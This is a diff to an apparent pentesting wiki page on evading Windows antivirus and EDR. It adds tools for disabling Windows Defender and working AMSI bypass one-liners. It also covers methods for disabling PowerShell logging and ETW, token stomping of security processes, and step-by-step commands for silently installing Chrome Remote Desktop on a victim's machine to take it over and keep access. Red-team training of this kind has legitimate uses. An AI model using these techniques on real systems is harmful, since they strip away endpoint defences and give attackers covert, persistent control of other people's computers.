@@ -4,6 +4,12 @@
 
 **This page was written by** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**
 
+## Stop Defender
+
+- [defendnot](https://github.com/es3n1n/defendnot): A tool to stop Windows Defender from working.
+- [no-defender](https://github.com/es3n1n/no-defender): A tool to stop Windows Defender from working faking another AV.
+- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)
+
 ## **AV Evasion Methodology**
 
 Currently, AVs use different methods for checking if a file is malicious or not, static detection, dynamic analysis, and for the more advanced EDRs, behavioural analysis.
@@ -24,7 +30,7 @@ Sometimes all you need to do is change some strings in your binary or script to 
 
 If you develop your own tools, there will be no known bad signatures, but this takes a lot of time and effort.
 
-> [!NOTE]
+> [!TIP]
 > A good way for checking against Windows Defender static detection is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). It basically splits the file into multiple segments and then tasks Defender to scan each one individually, this way, it can tell you exactly what are the flagged strings or bytes in your binary.
 
 I highly recommend you check out this [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) about practical AV Evasion.
@@ -51,7 +57,7 @@ For example, if you want to dump LSASS, **do you really need to use mimikatz**? 
 
 The right answer is probably the latter. Taking mimikatz as an example, it's probably one of, if not the most flagged piece of malware by AVs and EDRs, while the project itself is super cool, it's also a nightmare to work with it to get around AVs, so just look for alternatives for what you're trying to achieve.
 
-> [!NOTE]
+> [!TIP]
 > When modifying your payloads for evasion, make sure to **turn off automatic sample submission** in defender, and please, seriously, **DO NOT UPLOAD TO VIRUSTOTAL** if your goal is achieving evasion in the long run. If you want to check if your payload gets detected by a particular AV, install it on a VM, try to turn off the automatic sample submission, and test it there until you're satisfied with the result.
 
 ## EXEs vs DLLs
@@ -70,7 +76,7 @@ Now we'll show some tricks you can use with DLL files to be much more stealthier
 
 You can check for programs susceptible to DLL Sideloading using [Siofra](https://github.com/Cybereason/siofra) and the following powershell script:
 
-```powershell
+```bash
 Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
     $binarytoCheck = "C:\Program Files\" + $_
     C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
@@ -112,7 +118,7 @@ Both our shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) and the
 
 <figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>
 
-> [!NOTE]
+> [!TIP]
 > I **highly recommend** you watch [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) about DLL Sideloading and also [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) to learn more about what we've discussed more in-depth.
 
 ## [**Freeze**](https://github.com/optiv/Freeze)
@@ -130,7 +136,7 @@ Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freez
 
 <figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>
 
-> [!NOTE]
+> [!TIP]
 > Evasion is just a cat & mouse game, what works today could be detected tomorrow, so never rely on only one tool, if possible, try chaining multiple evasion techniques.
 
 ## AMSI (Anti-Malware Scan Interface)
@@ -155,6 +161,8 @@ Notice how it prepends `amsi:` and then the path to the executable from which th
 
 We didn't drop any file to disk, but still got caught in-memory because of AMSI.
 
+Moreover, starting with **.NET 4.8**, C# code is run through AMSI as well. This even affects `Assembly.Load(byte[])` to load in-memory execution. Thats why using lower versions of .NET (like 4.7.2 or below) is recommended for in-memory execution if you want to evade AMSI.
+
 There are a couple of ways to get around AMSI:
 
 - **Obfuscation**
@@ -171,7 +179,7 @@ Since AMSI is implemented by loading a DLL into the powershell (also cscript.exe
 
 Forcing the AMSI initialization to fail (amsiInitFailed) will result that no scan will be initiated for the current process. Originally this was disclosed by [Matt Graeber](https://twitter.com/mattifestation) and Microsoft has developed a signature to prevent wider usage.
 
-```powershell
+```bash
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 ```
 
@@ -179,7 +187,7 @@ All it took was one line of powershell code to render AMSI unusable for the curr
 
 Here is a modified AMSI bypass I took from this [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
 
-```powershell
+```bash
 Try{#Ams1 bypass technic nº 2
       $Xdatabase = 'Utils';$Homedrive = 'si'
       $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
@@ -199,17 +207,47 @@ Keep in mind, that this will probably get flagged once this post comes out, so y
 
 This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.
 
-> [!NOTE]
+> [!TIP]
 > Please read [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) for a more detailed explanation.
 
-There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [this repo](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.
+There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.
 
-Or this script taht via memory patching will patch each new Powersh
+This tools [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.
+
+**Remove the detected signature**
+
+You can use a tool such as **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** and **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** to remove the detected AMSI signature from the memory of the current process. This tool works by scanning the memory of the current process for the AMSI signature and then overwriting it with NOP instructions, effectively removing it from memory.
+
+**AV/EDR products that uses AMSI**
+
+You can find a list of AV/EDR products that uses AMSI in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.
+
+**Use Powershell version 2**
+If you use PowerShell version 2, AMSI will not be loaded, so you can run your scripts without being scanned by AMSI. You can do this:
+
+```bash
+powershell.exe -version 2
+```
+
+## PS Logging
+
+PowerShell logging is a feature that allows you to log all PowerShell commands executed on a system. This can be useful for auditing and troubleshooting purposes, but it can also be a **problem for attackers who want to evade detection**.
+
+To bypass PowerShell logging, you can use the following techniques:
+
+- **Disable PowerShell Transcription and Module Logging**: You can use a tool such as [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) for this purpose.
+- **Use Powershell version 2**: If you use PowerShell version 2, AMSI will not be loaded, so you can run your scripts without being scanned by AMSI. You can do this: `powershell.exe -version 2`
+- **Use an Unmanaged Powershell Session**: Use [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) to spawn a powershell withuot defenses (this is what `powerpick` from Cobal Strike uses).
+
 
 ## Obfuscation
 
+> [!TIP]
+> Several obfuscation techniques relies on encrypting data, which will increase the entropy of the binary which will make easier for AVs and EDRs to detect it. Be careful with this and maybe only apply encryption to specific sections of your code that is sensitive or needs to be hidden.
+
 There are several tools that can be used to **obfuscate C# clear-text code**, generate **metaprogramming templates** to compile binaries or **obfuscate compiled binaries** such as:
 
+- [**ConfuserEx**](https://github.com/yck1509/ConfuserEx): It's a great open-source obfuscator for .NET applications. It provides various protection techniques such as control flow obfuscation, anti-debugging, anti-tampering, and string encryption. It's recommened cause it allows even to obfuscate specific chunks of code.
 - [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
 - [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): The aim of this project is to provide an open-source fork of the [LLVM](http://www.llvm.org/) compilation suite able to provide increased software security through [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) and tamper-proofing.
 - [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstates how to use `C++11/14` language to generate, at compile time, obfuscated code without using any external tool and without modifying the compiler.
@@ -234,7 +272,7 @@ SmartScreen mainly works with a reputation-based approach, meaning that uncommon
 
 <figure><img src="../images/image (237).png" alt=""><figcaption><p>Checking the Zone.Identifier ADS for a file downloaded from the internet.</p></figcaption></figure>
 
-> [!NOTE]
+> [!TIP]
 > It's important to note that executables signed with a **trusted** signing certificate **won't trigger SmartScreen**.
 
 A very effective way to prevent your payloads from getting the Mark of The Web is by packaging them inside some sort of container like an ISO. This happens because Mark-of-the-Web (MOTW) **cannot** be applied to **non NTFS** volumes.
@@ -245,7 +283,7 @@ A very effective way to prevent your payloads from getting the Mark of The Web i
 
 Example usage:
 
-```powershell
+```bash
 PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso
 
 +      o     +              o   +      o     +              o
@@ -271,6 +309,15 @@ Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files 
 
 <figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>
 
+## ETW
+
+Event Tracing for Windows (ETW) is a powerful logging mechanism in Windows that allows applications and system components to **log events**. However, it can also be used by security products to monitor and detect malicious activities.
+
+Similar to how AMSI is disabled (bypassed) it's also possible to make the **`EtwEventWrite`** function of the user space process return immediately without logging any events. This is done by patching the function in memory to return immediately, effectively disabling ETW logging for that process.
+
+You can find more info in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.
+
+
 ## C# Assembly Reflection
 
 Loading C# binaries in memory has been known for quite some time and it's still a very great way for running your post-exploitation tools without getting caught by AV.
@@ -291,7 +338,7 @@ It's about injecting the post-exploitation malicious code **into its own process
 
 <figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>
 
-> [!NOTE]
+> [!TIP]
 > If you want to read more about C# Assembly loading, please check out this article [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) and their InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
 
 You can also load C# Assemblies **from PowerShell**, check out [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) and [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).
@@ -303,6 +350,27 @@ As proposed in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/
 By allowing access to the Interpreter Binaries and the environment on the SMB share you can **execute arbitrary code in these languages within memory** of the compromised machine.
 
 The repo indicates: Defender still scans the scripts but by utilising Go, Java, PHP etc we have **more flexibility to bypass static signatures**. Testing with random un-obfuscated reverse shell scripts in these languages has proved successful.
+
+## TokenStomping
+
+Token stomping is a technique that allows an attacker to **manipulate the access token or a security prouct like an EDR or AV**, allowing them to reduce it privileges so the process won't die but it won't have permissions to check for malicious activities.
+
+To prevent this Windows could **prevent external processes** from getting handles over the tokens of security processes.
+
+- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
+- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
+- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)
+
+## Using Trusted Software
+
+### Chrome Remote Desktop
+
+As described in [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), it's easy to just deploy the Chrome Remote Desktop in a victims PC and then use it to takeover it and maintain persistence:
+1. Download from https://remotedesktop.google.com/, click on "Set up via SSH", and then click on the MSI file for Windows to download the MSI file.
+2. Run the installer silently in the victim (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
+3. Go back to the Chrome Remote Desktop page and click next. The wizard will then ask you to authorize; click the Authorize button to continue.
+4. Execute the given parameter with some adjustments: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Note the pin param which allows to set the pin withuot using the GUI).
+ 
 
 ## Advanced Evasion
 
@@ -569,6 +637,6 @@ https://github.com/praetorian-code/vulcan
 
 ### More
 
-- [https://github.com/persianhydra/Xeexe-TopAntivirusEvasion](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)
+- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)
 
 {{#include ../banners/hacktricks-training.md}}
